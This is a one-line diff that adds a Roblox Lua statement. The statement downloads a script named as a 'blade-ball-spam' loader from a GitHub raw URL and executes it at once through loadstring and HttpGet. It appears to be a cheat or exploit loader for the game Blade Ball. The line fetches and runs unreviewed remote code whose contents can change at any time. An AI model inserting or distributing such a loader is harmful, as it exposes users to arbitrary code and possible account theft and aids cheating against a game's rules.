@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/blade-ball-spam3-ut5z9yl2o8bicv.lua"))()
